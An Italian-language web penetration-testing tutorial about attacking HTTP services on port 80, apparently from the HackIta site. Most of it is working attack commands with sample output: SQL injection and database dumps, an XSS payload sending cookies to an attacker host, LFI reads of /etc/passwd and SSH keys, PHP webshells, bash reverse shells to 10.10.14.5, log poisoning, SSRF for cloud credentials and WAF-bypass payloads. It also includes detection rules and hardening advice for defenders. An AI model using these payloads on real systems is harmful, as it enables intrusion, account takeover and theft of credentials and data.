---
title: 'Porta 80 HTTP: SQL Injection, XSS, LFI e Attack Surface Web'
slug: porta-80-http
description: >-
  La porta 80 HTTP resta il punto d’ingresso principale per testare applicazioni
  web, API, pannelli admin e servizi interni. Scopri enumerazione, SQLi, XSS,
  LFI, SSRF e le tecniche più utili nel web pentest.
image: /porta-80-http.webp
draft: false
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - sql
  - xss
---

La porta 80 è il **cuore del web moderno** — HTTP (Hypertext Transfer Protocol) su TCP porta 80 trasporta il 90% del traffico Internet visibile, servendo miliardi di pagine web daily. Ma in penetration testing, la porta 80 rappresenta la **superficie d'attacco più vasta dell'intero stack tecnologico**: [SQL injection](https://hackita.it/articoli/sql-injection), [XSS](https://hackita.it/articoli/xss), [directory traversal](https://hackita.it/articoli/directory-traversal), [LFI](https://hackita.it/articoli/lfi)/[RFI](https://hackita.it/articoli/rfi), command injection, [SSRF](https://hackita.it/articoli/ssrf), [XXE](https://hackita.it/articoli/xxe), authentication bypass, session hijacking, [CSRF](https://hackita.it/articoli/csrf), e centinaia di altri vettori. Ogni web application esposta su porta 80 è potenzialmente vulnerabile — OWASP Top 10 documenta che 90%+ delle applicazioni web hanno almeno una vulnerabilità exploitabile. In ethical hacking, la porta 80 è dove si spende il **maggior tempo di testing** perché il payoff è massimo: da XSS a RCE server-side, da credential leak a database dump completo.

HTTP su porta 80 domina il 2026 nonostante HTTPS (porta 443) sia standard per siti pubblici, perché: internal corporate apps usano ancora HTTP plain, IoT devices embedded hanno HTTP-only interfaces, Docker containers espongono API HTTP internamente, e redirect HTTP→HTTPS su porta 80 creano comunque attack surface. Ogni pentester deve masterare HTTP exploitation — è il **90% del lavoro** in web app pentest.

***

## Anatomia tecnica di HTTP

HTTP usa **TCP porta 80** con protocollo testuale request/response.

**Flow HTTP classico:**

1. **TCP Handshake** — Client connette porta 80 del server
2. **HTTP Request** — Client invia `GET /index.html HTTP/1.1` + headers
3. **HTTP Response** — Server risponde `HTTP/1.1 200 OK` + headers + body
4. **Connection** — Persistent (HTTP/1.1) o close (HTTP/1.0)

**Struttura HTTP Request:**

```http
GET /admin/login.php?user=admin HTTP/1.1
Host: victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: text/html,application/json
Cookie: PHPSESSID=abc123def456
Connection: keep-alive
```

**Struttura HTTP Response:**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=xyz789; HttpOnly
Content-Length: 1234

<!DOCTYPE html>
<html>...
```

**HTTP methods critici:**

| Method  | Uso standard      | Abuse potential           |
| ------- | ----------------- | ------------------------- |
| GET     | Retrieve resource | Parameter injection, IDOR |
| POST    | Submit data       | SQLi, XSS, file upload    |
| PUT     | Upload file       | **Arbitrary file write**  |
| DELETE  | Delete resource   | **Unauthorized deletion** |
| OPTIONS | List methods      | Information disclosure    |
| TRACE   | Echo request      | **XSS via TRACE**         |
| CONNECT | HTTP tunnel       | SSRF, proxy abuse         |

**HTTP response codes critici:**

| Code    | Significato  | Pentest relevance                      |
| ------- | ------------ | -------------------------------------- |
| 200     | OK           | Successful exploitation                |
| 301/302 | Redirect     | Open redirect vulnerability            |
| 401     | Unauthorized | Auth bypass target                     |
| 403     | Forbidden    | Directory traversal attempt            |
| 404     | Not Found    | Fuzzing endpoint                       |
| 500     | Server Error | **Application crash = vuln indicator** |

Le **misconfigurazioni comuni**: directory listing abilitato (index of /), debug info in headers (X-Powered-By, Server version), HTTP methods pericolosi abilitati (PUT, DELETE, TRACE), CORS wildcard (`Access-Control-Allow-Origin: *`), e verbose error messages (stack trace in 500 error).

***

## Enumerazione base

```bash
nmap -sV -p 80 10.10.10.80
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Corporate Portal Login
```

**Banner grabbing manuale:**

```bash
nc -vn 10.10.10.80 80
HEAD / HTTP/1.1
Host: victim.com

```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Content-Type: text/html; charset=UTF-8
```

**Technology fingerprinting con whatweb:**

```bash
whatweb http://10.10.10.80
```

```
http://10.10.10.80 [200 OK]
  Country: ITALY
  HTTPServer: Apache/2.4.41 (Ubuntu)
  IP: 10.10.10.80
  PHP[7.4.3]
  Script: text/javascript
  Title: Corporate Portal Login
  X-Powered-By: PHP/7.4.3
```

***

## Enumerazione avanzata: web reconnaissance

### Directory fuzzing

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.80/FUZZ -mc 200,301,302,403
```

```
admin                   [Status: 301, Size: 312]
uploads                 [Status: 403, Size: 277]
backup                  [Status: 200, Size: 1567]
api                     [Status: 301, Size: 310]
.git                    [Status: 403, Size: 277]
```

**Directory listing check:**

```bash
curl http://10.10.10.80/uploads/
```

```html
<h1>Index of /uploads</h1>
<ul>
  <li><a href="database_backup.sql">database_backup.sql</a></li>
  <li><a href="passwords.txt">passwords.txt</a></li>
</ul>
```

### [Nikto](https://hackita.it/articoli/nikto) vulnerability scan

```bash
nikto -h http://10.10.10.80
```

```
+ Server: Apache/2.4.41 (Ubuntu)
+ The X-XSS-Protection header is not defined
+ The X-Content-Type-Options header is not set
+ Entry '/admin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3092: /admin/: This might be interesting
+ /backup.sql: Database backup file found
```

### Parameter discovery

```bash
# Discover hidden parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.10.80/search.php?FUZZ=test -fs 0
```

```
query                   [Status: 200, Size: 3421]
debug                   [Status: 200, Size: 9876]  # Debug parameter!
```

***

## Tecniche offensive (Top 10 web vulnerabilities) 

###### Tutte le tecniche menzionate hanno guide presenti su hackita.it, scopritele tutte. Apprenderete nuove tecniche segrete..

### 1. SQL Injection

```bash
# Test basic SQLi
curl "http://10.10.10.80/product.php?id=1' OR '1'='1"
```

**Output con vulnerability:**

```html
<h1>Products</h1>
<!-- All products displayed instead of ID=1 -->
```

**SQLMap automated exploitation:**

```bash
sqlmap -u "http://10.10.10.80/product.php?id=1" --dbs --batch
```

```
available databases [3]:
[*] information_schema
[*] mysql
[*] corporate_db
```

```bash
# Dump database
sqlmap -u "http://10.10.10.80/product.php?id=1" -D corporate_db --dump
```

```
Table: users
[3 entries]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | jdoe     | 482c811da5d5b4bc6d497ffa98491e38 |
+----+----------+----------------------------------+
```

### 2. Cross-Site Scripting (XSS)

**Reflected XSS:**

```bash
curl "http://10.10.10.80/search.php?q=<script>alert(1)</script>"
```

Se `<script>alert(1)</script>` appare in response → **XSS vulnerable**.

**Stored XSS (comment field):**

```bash
curl -X POST http://10.10.10.80/comment.php \
  -d "comment=<img src=x onerror=alert(document.cookie)>"
```

Ogni utente che visita → cookie leaked.

**XSS payload avanzato (cookie steal):**

```html
<script>
fetch('http://10.10.14.5:8000/?c='+document.cookie)
</script>
```

### 3. Directory Traversal / Local File Inclusion (LFI)

```bash
# Test LFI
curl "http://10.10.10.80/page.php?file=../../../../etc/passwd"
```

**Output vulnerable:**

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Read SSH keys:**

```bash
curl "http://10.10.10.80/page.php?file=../../../../root/.ssh/id_rsa"
```

**PHP filter wrapper (LFI to code disclosure):**

```bash
curl "http://10.10.10.80/page.php?file=php://filter/convert.base64-encode/resource=config.php"
```

```
PD9waHAKJGRiX3Bhc3MgPSAiU3VwZXJTZWNyZXRQYXNzIjsKPz4=
```

```bash
echo "PD9waHAKJGRiX3Bhc3MgPSAiU3VwZXJTZWNyZXRQYXNzIjsKPz4=" | base64 -d
# <?php $db_pass = "SuperSecretPass"; ?>
```

### 4. Remote File Inclusion (RFI)

```bash
# Host malicious PHP on attacker server
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.txt

# Include remote file
curl "http://10.10.10.80/page.php?file=http://10.10.14.5/shell.txt&cmd=id"
```

```
uid=33(www-data) gid=33(www-data)
```

### 5. Command Injection

```bash
# Test ping command injection
curl "http://10.10.10.80/ping.php?host=8.8.8.8;id"
```

**Output vulnerable:**

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
uid=33(www-data) gid=33(www-data)
```

**Reverse shell:**

```bash
curl "http://10.10.10.80/ping.php?host=8.8.8.8;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

### 6. File Upload Bypass

```bash
# Upload PHP webshell
cat <<EOF > shell.php
<?php system(\$_GET['cmd']); ?>
EOF

curl -X POST -F "file=@shell.php" http://10.10.10.80/upload.php
```

**Access uploaded shell:**

```bash
curl "http://10.10.10.80/uploads/shell.php?cmd=whoami"
# www-data
```

**Bypass extension filter (double extension):**

```bash
mv shell.php shell.php.jpg
curl -X POST -F "file=@shell.php.jpg" http://10.10.10.80/upload.php
# Server may process as PHP if misconfigured
```

### 7. Server-Side Request Forgery (SSRF)

```bash
# Test SSRF on URL parameter
curl "http://10.10.10.80/fetch.php?url=http://127.0.0.1:22"
```

**Access internal services:**

```bash
# Read AWS metadata (cloud environments)
curl "http://10.10.10.80/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### 8. Authentication Bypass

**SQL injection auth bypass:**

```bash
curl -X POST http://10.10.10.80/login.php \
  -d "username=admin' OR '1'='1&password=anything"
```

**Default credentials:**

```
admin:admin
admin:password
root:root
administrator:administrator
```

### 9. Session Hijacking

```bash
# Steal session cookie via XSS
# Cookie: PHPSESSID=abc123def456

# Replay cookie
curl -H "Cookie: PHPSESSID=abc123def456" http://10.10.10.80/admin/
```

### 10. XML External Entity (XXE)

```bash
cat <<EOF > xxe.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
EOF

curl -X POST -H "Content-Type: application/xml" -d @xxe.xml http://10.10.10.80/api/parse
```

***

## Scenari pratici

### Scenario 1 — SQLi → database dump → admin access

**Contesto:** web app corporate con login form.

```bash
# Fase 1: Identify SQLi
sqlmap -u "http://10.10.10.80/login.php" --data="username=admin&password=test" --batch
# [CRITICAL] Parameter 'username' is vulnerable to SQL injection
```

```bash
# Fase 2: Enumerate databases
sqlmap -u "http://10.10.10.80/login.php" --data="username=admin&password=test" --dbs
# corporate_db
```

```bash
# Fase 3: Dump users table
sqlmap -u "http://10.10.10.80/login.php" --data="username=admin&password=test" -D corporate_db -T users --dump
# admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5: password)
```

```bash
# Fase 4: Login with cracked password
curl -X POST http://10.10.10.80/login.php -d "username=admin&password=password"
# Set-Cookie: session=xyz789
```

**Timeline:** 15 minuti da SQLi discovery a admin panel access.

### Scenario 2 — LFI → RCE via log poisoning

**Contesto:** LFI vulnerability + Apache access log.

```bash
# Fase 1: Verify LFI
curl "http://10.10.10.80/page.php?file=../../../../etc/passwd"
# root:x:0:0:root:/root:/bin/bash
```

```bash
# Fase 2: Poison Apache log
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.10.10.80/
# User-Agent logged in /var/log/apache2/access.log
```

```bash
# Fase 3: Include log file
curl "http://10.10.10.80/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
# uid=33(www-data)
```

```bash
# Fase 4: Reverse shell
curl "http://10.10.10.80/page.php?file=../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

### Scenario 3 — XSS → session hijack → account takeover

**Contesto:** stored XSS in comment field.

```bash
# Fase 1: Plant XSS payload
curl -X POST http://10.10.10.80/comment.php \
  -d "comment=<script>fetch('http://10.10.14.5:8000/?c='+document.cookie)</script>"
```

```bash
# Fase 2: Setup listener
nc -lvnp 8000
```

**Admin visits page → cookie leaked:**

```
GET /?c=PHPSESSID=admin_session_xyz789 HTTP/1.1
```

```bash
# Fase 3: Session hijack
curl -H "Cookie: PHPSESSID=admin_session_xyz789" http://10.10.10.80/admin/
# Admin panel accessed
```

***

## Toolchain integration

**Pipeline HTTP exploitation:**

```
RECONNAISSANCE
│
├─ nmap -sV -p 80 <target>                  → Service detection
├─ whatweb <url>                            → Technology stack
├─ nikto -h <url>                           → Vulnerability scan
└─ ffuf directory fuzzing                   → Hidden endpoints

VULNERABILITY ASSESSMENT
│
├─ [SQLMap](https://hackita.it/articoli/sqlmap) → SQL injection
├─ [XSS testing](https://hackita.it/articoli/xss) → Reflected/Stored XSS
├─ LFI/RFI testing → File inclusion
├─ Command injection → RCE testing
└─ [Burp Suite](https://hackita.it/articoli/burp-suite) → Manual testing

EXPLOITATION
│
├─ A) SQLi → database dump → credential harvest
├─ B) LFI → log poisoning → RCE
├─ C) File upload → webshell → system access
├─ D) XSS → session hijack → account takeover
└─ E) SSRF → internal service access

POST-EXPLOITATION
│
├─ Web shell → [reverse shell](https://hackita.it/articoli/reverse-shell)
├─ [Privilege escalation](https://hackita.it/articoli/privesc-linux)
└─ [Lateral movement](https://hackita.it/articoli/pivoting)
```

***

## Detection & evasion

### Lato Blue Team

**WAF (Web Application Firewall):**

```
ModSecurity rules:
- Block SQL keywords (UNION, SELECT, OR 1=1)
- Block XSS patterns (<script>, onerror=)
- Block directory traversal (../, ..\)
```

**Log monitoring:**

```bash
# Apache access.log
tail -f /var/log/apache2/access.log | grep -E "(\.\./|<script>|' OR|UNION)"
```

**IDS signatures (Snort):**

```
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; content:"' OR '1'='1"; sid:1000100;)
alert tcp any any -> $HOME_NET 80 (msg:"XSS Attempt"; content:"<script>"; sid:1000101;)
```

### Lato Red Team: WAF bypass

**SQL injection bypass:**

```sql
-- Standard: ' OR '1'='1
-- Bypass: ' OR 1=1--
-- Bypass: ' OR 1=1#
-- Bypass: ' OR 'x'='x
-- Bypass: ' OR true--
```

**XSS bypass:**

```html
<!-- Standard: <script>alert(1)</script> -->
<!-- Bypass: <img src=x onerror=alert(1)> -->
<!-- Bypass: <svg/onload=alert(1)> -->
<!-- Bypass: <iframe src="javascript:alert(1)"> -->
```

**Encoding bypass:**

```bash
# URL encode
curl "http://10.10.10.80/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encode
curl "http://10.10.10.80/page.php?file=%252e%252e%252f"
```

***

## Performance & scaling

**Automated scanning (single target):**

```bash
time nikto -h http://10.10.10.80
# real 5m30s
```

**Directory fuzzing:**

```bash
time ffuf -w wordlist.txt -u http://10.10.10.80/FUZZ
# 10,000 words: ~2 minutes
```

**SQLMap exploitation:**

```bash
time sqlmap -u "http://10.10.10.80/product.php?id=1" --dump-all --batch
# Database dump: 10-30 minutes depending on size
```

***

## Tabelle tecniche

### Command reference

| Comando                          | Scopo                  |
| -------------------------------- | ---------------------- |
| `nmap -sV -p 80 <target>`        | Service detection      |
| `whatweb <url>`                  | Technology fingerprint |
| `nikto -h <url>`                 | Vulnerability scan     |
| `ffuf -w wordlist -u <url>/FUZZ` | Directory fuzzing      |
| `sqlmap -u <url> --dbs`          | SQL injection          |
| `curl -X POST -d "data" <url>`   | POST request           |
| `burpsuite`                      | Manual web testing     |

### HTTP status codes

| Code | Meaning             | Pentest use             |
| ---- | ------------------- | ----------------------- |
| 200  | OK                  | Successful request      |
| 301  | Moved Permanently   | Open redirect check     |
| 302  | Found               | Temporary redirect      |
| 401  | Unauthorized        | Auth required           |
| 403  | Forbidden           | Access denied (bypass?) |
| 404  | Not Found           | Fuzzing                 |
| 500  | Internal Error      | **Crash indicator**     |
| 503  | Service Unavailable | DoS result              |

***

## Troubleshooting

| Errore                    | Causa                 | Fix                    |
| ------------------------- | --------------------- | ---------------------- |
| Connection refused        | Service down          | Verify nmap scan       |
| 403 Forbidden             | IP blocked or WAF     | Change source IP       |
| SQLMap no injection found | Not vulnerable or WAF | Try manual payloads    |
| XSS not executing         | CSP policy            | Check response headers |
| File upload rejected      | Extension filter      | Try double extension   |

***

## FAQ

**Qual è la vulnerabilità web più comune nel 2026?**

**SQL Injection** e **XSS** dominano ancora. OWASP Top 10 2025 conferma: injection flaws (#1) e XSS (#3) presenti in 70%+ web apps.

**Posso fare pentest HTTP senza permesso?**

No. Web scanning senza autorizzazione è reato (art. 615-ter c.p. accesso abusivo). Usa solo lab personali, CTF, o engagement autorizzati.

**Qual è la differenza tra porta 80 e 443?**

Porta 80 = HTTP plaintext. Porta 443 = HTTPS cifrato (TLS/SSL). Attack vectors identici ma 443 richiede decrypt traffic.

**Come bypasso WAF?**

Encoding (URL encode, double encode), obfuscation (XSS con tag alternativi), timing (slow requests), e IP rotation.

**SQLMap è sufficiente per trovare tutte le SQLi?**

No. SQLMap trova \~80% SQLi ma blind SQLi complesse o WAF-protected richiedono testing manuale.

**Quale tool è migliore per web pentest?**

[Burp Suite](https://hackita.it/articoli/burp-suite) Pro per manual testing, SQLMap per SQLi, Nikto per quick scan, ffuf per fuzzing. Combinazione di tools è optimal.

***

## Cheat sheet finale

| Azione            | Comando                                    |
| ----------------- | ------------------------------------------ |
| Service scan      | `nmap -sV -p 80 <target>`                  |
| Technology ID     | `whatweb <url>`                            |
| Vuln scan         | `nikto -h <url>`                           |
| Directory fuzz    | `ffuf -w wordlist -u <url>/FUZZ`           |
| SQL injection     | `sqlmap -u "<url>?id=1" --dbs`             |
| XSS test          | `curl "<url>?q=<script>alert(1)</script>"` |
| LFI test          | `curl "<url>?file=../../../../etc/passwd"` |
| Command injection | `curl "<url>?cmd=;id"`                     |
| File upload       | `curl -X POST -F "file=@shell.php" <url>`  |

***

## Perché porta 80 è fondamentale

HTTP (porta 80) è il **90% del penetration testing moderno**. Reasons:

1. **Largest attack surface** — Ogni web app ha decine di endpoints vulnerabili
2. **Business logic flaws** — Non solo technical vulns, ma anche design flaws
3. **High impact** — SQLi → database dump = game over
4. **Universal** — Ogni organizzazione ha web apps
5. **Constant evolution** — Nuovi framework = nuove vulnerabilities

OWASP data: 94% data breaches del 2025 hanno coinvolto web application exploitation. In pentest enterprise, 80%+ del tempo è speso su HTTP/HTTPS testing.

## HTTP vs HTTPS security

Porta 80 (HTTP) vs porta 443 (HTTPS):

| Aspetto             | HTTP (80)   | HTTPS (443)                  |
| ------------------- | ----------- | ---------------------------- |
| Encryption          | ❌ Plaintext | ✅ TLS encrypted              |
| MITM risk           | ✅ Alto      | ⚠️ Basso (se cert valid)     |
| Credential sniffing | ✅ Possibile | ❌ Cifrato                    |
| Vulnerabilities     | Identiche   | Identiche                    |
| Performance         | Faster      | Slower (encryption overhead) |

**Key insight:** HTTPS protegge confidentiality (no sniffing) ma **non protegge da application-level vulnerabilities** (SQLi, XSS funzionano identiche su HTTPS).

## Hardening production HTTP

**Best practices:**

1. **Disable HTTP, force HTTPS** (redirect 80→443)
2. **WAF deployment** (ModSecurity, Cloudflare)
3. **Input validation** (whitelist, not blacklist)
4. **Output encoding** (prevent XSS)
5. **Prepared statements** (prevent SQLi)
6. **Security headers:**

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
```

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori personali, piattaforme CTF, pentest con autorizzazione scritta. L'accesso abusivo a web applications è reato (art. 615-ter c.p.). L'autore e HackIta declinano responsabilità. RFC 2616 HTTP/1.1: [https://www.rfc-editor.org/rfc/rfc2616.html](https://www.rfc-editor.org/rfc/rfc2616.html)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
